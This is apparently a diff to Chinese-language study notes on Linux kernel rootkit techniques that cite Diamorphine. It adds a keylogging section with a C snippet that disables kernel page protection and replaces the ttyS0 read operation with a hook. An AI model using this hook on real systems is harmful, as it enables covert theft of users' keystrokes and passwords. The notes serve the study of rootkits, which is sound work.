@@ -830,6 +830,31 @@ else
 rb_add(mod->mkobj.kobj.sd);
 ```
 
+### 用户键盘记录
+
+通过VFS hook，hook ttyS0 的read函数
+
+```c
+/* open tty to hook read function */
+file = filp_open("/dev/ttyS0", O_RDONLY, 0);
+
+/* backup original read function */
+original_read = file->f_op->read;
+
+disable_page_protection();
+
+/* override original read */
+((struct file_operations *)file->f_op)->read = (void *)fake_read;
+
+enable_page_protection();
+```
+
+
+
+# 
+
+
+
 # 资料
 
 Diamorphine
